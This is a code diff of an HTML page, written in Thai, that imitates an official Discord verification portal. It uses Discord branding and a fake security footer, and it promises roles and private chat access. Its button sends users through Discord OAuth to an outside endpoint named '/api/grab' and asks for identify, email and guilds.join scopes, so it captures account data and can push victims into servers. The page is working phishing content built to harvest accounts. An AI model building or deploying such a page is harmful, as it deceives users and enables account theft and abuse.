@@ -3,29 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord | Verification System</title>
+    <title>Discord - Verification Portal</title>
     <style>
-        :root { --discord-bg: #313338; --discord-card: #2b2d31; --discord-blurple: #5865f2; --discord-text: #f2f3f5; --discord-muted: #949ba4; }
-        body { background-color: var(--discord-bg); color: var(--discord-text); font-family: 'gg sans', 'Noto Sans', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { background-color: var(--discord-card); width: 440px; padding: 32px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.24); text-align: center; border: 1px solid rgba(255,255,255,0.05); }
-        .shield-wrapper { width: 80px; height: 80px; margin: 0 auto 20px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
-        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #fff; }
-        p { font-size: 16px; color: var(--discord-muted); line-height: 20px; margin-bottom: 28px; }
-        .btn-verify { background-color: var(--discord-blurple); color: white; text-decoration: none; padding: 12px 24px; border-radius: 3px; display: block; font-weight: 600; font-size: 16px; transition: 0.2s; cursor: pointer; border: none; width: 100%; box-sizing: border-box; }
-        .btn-verify:hover { background-color: #4752c4; }
-        .footer { margin-top: 20px; font-size: 12px; color: var(--discord-muted); text-transform: uppercase; letter-spacing: 0.5px; opacity: 0.6; }
+        :root { --discord-blurple: #5865f2; --discord-bg: #313338; --discord-card: #2b2d31; --text: #f2f3f5; }
+        body { background-color: var(--discord-bg); color: var(--text); font-family: 'gg sans', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { background-color: var(--discord-card); width: 420px; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; z-index: 10; border: 1px solid rgba(255,255,255,0.05); }
+        
+        /* โลโก้ดิสคอสขยับได้ (Floating & Rotating) */
+        .discord-logo { width: 100px; height: 100px; margin-bottom: 25px; animation: float 3s ease-in-out infinite; filter: drop-shadow(0 0 15px var(--discord-blurple)); }
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-15px) rotate(5deg); }
+        }
+
+        h1 { font-size: 26px; font-weight: 800; margin-bottom: 10px; }
+        p { color: #b9bbbe; font-size: 15px; line-height: 22px; margin-bottom: 35px; }
+        
+        .btn-verify { background-color: var(--discord-blurple); color: white; text-decoration: none; padding: 14px 0; border-radius: 5px; display: block; font-weight: 700; font-size: 18px; transition: 0.25s; width: 100%; border: none; cursor: pointer; }
+        .btn-verify:hover { background-color: #4752c4; transform: scale(1.02); box-shadow: 0 5px 15px rgba(88,101,242,0.4); }
+        
+        .footer { margin-top: 25px; font-size: 11px; color: #72767d; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="shield-wrapper"><img src="https://i.imgur.com/KzYF7fF.png" style="width:100%;"></div>
-        <h1>ยืนยันตัวตน</h1>
-        <p>เซิร์ฟเวอร์นี้ถูกป้องกันด้วยระบบความปลอดภัย กรุณายืนยันตัวตนเพื่อรับบทบาทและเข้าถึงห้องแชท</p>
+        <img src="https://assets-global.website-files.com/6257adef93867e3ef29194a1/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="discord-logo">
         
-        <a href="https://discord.com/api/oauth2/authorize?client_id=ใส่_CLIENT_ID_มหาเทพ&redirect_uri=https://ชื่อเว็บมหาเทพ.vercel.app/api/grab&response_type=code&scope=identify%20email%20guilds%20connections" class="btn-verify">ยืนยันตัวตนตอนนี้</a>
+        <h1>ยืนยันยศของคุณ</h1>
+        <p>เชื่อมต่อบัญชีของคุณเพื่อรับยศอัตโนมัติภายในเซิร์ฟเวอร์ และเข้าถึงห้องแชทพิเศษลับเฉพาะสำหรับสมาชิกเท่านั้น</p>
         
-        <div class="footer">Protected by Discord Security Team</div>
+        <a href="https://discord.com/api/oauth2/authorize?client_id=ใส่_CLIENT_ID_มหาเทพ&redirect_uri=https://index-html-five.vercel.app/api/grab&response_type=code&scope=identify%20email%20guilds.join" class="btn-verify">ยืนยันตัวตนทันที</a>
+        
+        <div class="footer">Secure Cloud Verification © 2026</div>
     </div>
 </body>
 </html>
